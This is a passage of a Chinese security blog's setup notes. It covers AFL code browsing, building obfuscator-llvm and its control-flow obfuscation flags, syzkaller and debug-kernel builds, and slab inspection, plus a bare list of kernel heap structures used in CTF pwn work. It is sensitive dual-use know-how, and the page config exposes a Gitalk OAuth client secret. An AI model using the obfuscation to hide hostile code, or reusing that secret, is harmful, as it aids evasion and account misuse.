        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230220223230920.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230220223230920.png" /></p>
<h3 id="woboq-afl">woboq afl</h3>
<p>前提：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">afl源码、woboq、bear
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="生成compile_commandsjson文件">生成compile_commands.json文件</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd ~
</span></span><span class="line"><span class="cl">git clone https://github.com/google/AFL afl
</span></span><span class="line"><span class="cl">cd afl
</span></span><span class="line"><span class="cl">sudo bear make
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="解析-1">解析</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ~/codebrowser
</span></span><span class="line"><span class="cl">./generator/codebrowser_generator -b /home/ubuntu/afl/ -a -o /home/ubuntu/woboq/afl/2.57 -p 2.57:/home/ubuntu/afl:2.57
</span></span><span class="line"><span class="cl">./indexgenerator/codebrowser_indexgenerator /home/ubuntu/woboq/afl/2.57
</span></span><span class="line"><span class="cl">sudo cp -rv ./data /home/ubuntu/woboq/afl/data
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /home/ubuntu/woboq/afl/ <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">9999</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230313225940580.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230313225940580.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230313225940580.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230313225940580.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230313225940580.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230313225940580.png" /></p>
<h2 id="obfuscator-llvm">obfuscator-llvm</h2>
<p>需要用gcc-8 g++-8</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git
</span></span><span class="line"><span class="cl">sudo apt-get install gcc-8 g++-8 -y
</span></span><span class="line"><span class="cl">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 <span class="m">8</span> <span class="c1">#配置优先级</span>
</span></span><span class="line"><span class="cl">sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-8 <span class="m">8</span> <span class="c1">#配置优先级</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>修改/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h</p>
<p>定位到第690行 把char 改成 uint_8</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125180925811.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125180925811.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125180925811.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125180925811.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125180925811.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125180925811.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd obfuscator
</span></span><span class="line"><span class="cl">mkdir build
</span></span><span class="line"><span class="cl">cd build
</span></span><span class="line"><span class="cl">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF /home/ubuntu/obfuscator/
</span></span><span class="line"><span class="cl">sudo make -j7
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125181338709.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125181338709.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125181338709.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125181338709.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230125181338709.png"
        title="image-20230125181338709" /></p>
<p>编译到后面，即使没有到 100%全部成功， 只要4个关键文件clang clang++ clang-4.0 clang-format 是在的</p>
<h4 id="例子">例子</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~/obfuscator/build/bin/clang pwn.c -o pwn -mllvm -fla -mllvm -sub -mllvm -sub_loop=3 -mllvm -bcf -mllvm -bcf_prob=40 
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="开启控制流扁平化">开启控制流扁平化</h4>
<p><code>-mllvm -fla</code> 开启控制流扁平化
<code>-mllvm -split</code> 激活基本块划分。一起使用时能提高打平能力。
<code>-mllvm -split_num=3</code> 如果激活控制流打平，对每一个基本块应用三次控制流打平。默认使用1次。</p>
<h4 id="开启指令替换">开启指令替换</h4>
<p><code>-mllvm -sub</code> 开启指令替换
<code>-mllvm -sub_loop=3</code> 如果激活了指令替换，使用这个选项在一个函数中应用3次指令替换。默认应用1次。</p>
<h4 id="开启虚假控制流">开启虚假控制流</h4>
<p><code>-mllvm -bcf</code> 开启虚假控制流
<code>bcf</code>可以配合下面参数使用
<code>-mllvm -bcf_loop=3</code> 设置函数混淆次数为3次 不加此选项默认为1次
<code>-mllvm -bcf_prob=40</code> 设置代码块被混淆的概率是40%，默认30%</p>
<h2 id="pwn题批量部署">pwn题批量部署</h2>
<h2 id="ida静态编译符号表恢复">ida静态编译符号表恢复</h2>
<p>快捷键：shift + f5</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/push0ebp/sig-database.git
</span></span></code></pre></td></tr></table>
</div>
</div><p>把需要的sig文件放到对应架构的文件夹下面即可</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230414215213372.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230414215213372.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230414215213372.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230414215213372.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230414215213372.png"
        title="image-20230414215213372" /></p>
<h2 id="syzkaller环境搭建">syzkaller环境搭建</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install golang
</span></span><span class="line"><span class="cl">sudo apt install build-essential flex bison libssl-dev libelf-dev bc qemu
</span></span><span class="line"><span class="cl">git clone https://github.com/google/syzkaller
</span></span><span class="line"><span class="cl">cd syzkaller
</span></span><span class="line"><span class="cl">sudo make all
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux-内核编译">linux 内核编译</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison zstd -y
</span></span><span class="line"><span class="cl">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.10.102.tar.gz
</span></span><span class="line"><span class="cl">unar linux-5.10.102.tar.gz
</span></span><span class="line"><span class="cl">cd linux-5.10.102/
</span></span><span class="line"><span class="cl">make menuconfig
</span></span></code></pre></td></tr></table>
</div>
</div><p>勾选</p>
<ul>
<li><code>Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</code></li>
<li><code>Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger</code></li>
</ul>
<p>config</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="c"># Coverage collection.
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">CONFIG_KCOV</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Debug info for symbolization.
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">CONFIG_DEBUG_INFO</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Memory bug detector
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">CONFIG_KASAN</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_KASAN_INLINE</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Required for Debian Stretch
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">CONFIG_CONFIGFS_FS</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_SECURITYFS</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_CMDLINE_BOOL</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_CMDLINE</span><span class="o">=</span><span class="s2">&#34;net.ifnames=0&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_VIRTIO_NET</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_E1000</span><span class="o">=</span>y
</span></span><span class="line"><span class="cl"><span class="nv">CONFIG_E1000E</span><span class="o">=</span>y
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo make bzImage -j$(nproc) &amp;&amp; sudo make modules -j$(nproc)
</span></span></code></pre></td></tr></table>
</div>
</div><p>编译出的在arch/x86_64/boot/bzImage</p>
<h2 id="kernel相关">kernel相关</h2>
<h3 id="常用命令">常用命令</h3>
<h4 id="查看保护机制">查看保护机制</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /sys/devices/system/cpu/vulnerabilities/*
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="查看slab">查看slab</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /proc/slabinfo
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="查看slab-1">查看slab</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin@vm:~$ sudo cat /sys/kernel/slab/filp/object_size # 每个object的大小
</span></span><span class="line"><span class="cl">256
</span></span><span class="line"><span class="cl">admin@vm:~$ sudo cat /sys/kernel/slab/filp/objs_per_slab # 每个slab中可容纳多少object
</span></span><span class="line"><span class="cl">16
</span></span><span class="line"><span class="cl">admin@vm:~$ sudo cat /sys/kernel/slab/filp/cpu_partial # cpu partial list最大阈值
</span></span><span class="line"><span class="cl">13
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 打包命令
</span></span><span class="line"><span class="cl">find . | cpio -o --format=newc &gt; ../../rootfs.img
</span></span><span class="line"><span class="cl"># 解包命令
</span></span><span class="line"><span class="cl">cpio -idmv &lt; rootfs.img
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="查看最大文件打开数量">查看最大文件打开数量</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">ulimit</span> -n
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pahole安装">pahole安装</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install libdw-dev
</span></span><span class="line"><span class="cl">git clone https://github.com/jmesmon/pahole
</span></span><span class="line"><span class="cl">cd pahole
</span></span><span class="line"><span class="cl">mkdir build
</span></span><span class="line"><span class="cl">cd build
</span></span><span class="line"><span class="cl">cmake -D__LIB=lib ..
</span></span><span class="line"><span class="cl">sudo make 
</span></span><span class="line"><span class="cl">sudo make install
</span></span><span class="line"><span class="cl">sudo cp ./pahole /usr/local/bin/pahole
</span></span></code></pre></td></tr></table>
</div>
</div><p>报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/home/ubuntu/pahole/dwarves_fprintf.c:77:3: error: ‘DW_TAG_mutable_type’ undeclared here (not in a function); did you mean ‘DW_TAG_immutable_type’?
</span></span><span class="line"><span class="cl">  [DW_TAG_mutable_type]    = &#34;mutable_type&#34;,
</span></span><span class="line"><span class="cl">   ^~~~~~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">   DW_TAG_immutable_type
</span></span></code></pre></td></tr></table>
</div>
</div><p>注释掉/home/ubuntu/pahole/dwarves_fprintf.c 报错的那一行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[DW_TAG_mutable_type]    = &#34;mutable_type&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230203170356109.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230203170356109.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230203170356109.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230203170356109.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230203170356109.png"
        title="image-20230203170356109" /></p>
<h4 id="使用">使用</h4>
<p><code>pahole ./file</code></p>
<h2 id="挂载ptmx">挂载ptmx</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir -p /dev/pts 
</span></span><span class="line"><span class="cl">mount -vt devpts -o gid=4,mode=620 none /dev/pts
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="各种结构体">各种结构体</h3>
<h4 id="user_key_payload">user_key_payload</h4>
<p>限制是只能分配最多200个最长20000字节</p>
<h4 id="poll_list">poll_list</h4>
<h4 id="msg_msg">msg_msg</h4>
<h4 id="pipe_buffer">pipe_buffer</h4>
<h4 id="sk_buffer">sk_buffer</h4>
<h2 id="页表映射">页表映射</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027174850490.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027174850490.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027174850490.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027174850490.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027174850490.png"
        title="image-20231027174850490" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027173723014.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027173723014.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027173723014.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027173723014.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231027173723014.png"
        title="image-20231027173723014" /></p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2023-11-26&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/bd97330cc0b5cdb711e24388ffdf2d41595c6e6d" target="_blank" title="commit by cnitlrt(1258175307@qq.com) bd97330cc0b5cdb711e24388ffdf2d41595c6e6d: blog">
                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>bd97330</a></span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://cnitlrt.github.io/misc/" data-title="疑难杂症宝典" data-hashtags="tools"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://cnitlrt.github.io/misc/" data-hashtag="tools"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://cnitlrt.github.io/misc/" data-title="疑难杂症宝典"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://cnitlrt.github.io/misc/" data-title="疑难杂症宝典"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://cnitlrt.github.io/misc/" data-title="疑难杂症宝典"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/tools/">tools</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/qwb2021/" class="next" rel="next" title="QWB2021">QWB2021<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">cnitlrt</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["cnitlrt"],"clientID":"2a776c3dc5f0100884f8","clientSecret":"b98d034dacc1331a3d9df7825119701a0a4b9533","id":"2022-01-01T04:06:14+08:00","owner":"cnitlrt","repo":"cnitlrt.github.io","title":"疑难杂症宝典"}},"data":{"id-1":"cnitlrtの博客","id-2":"cnitlrtの博客"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
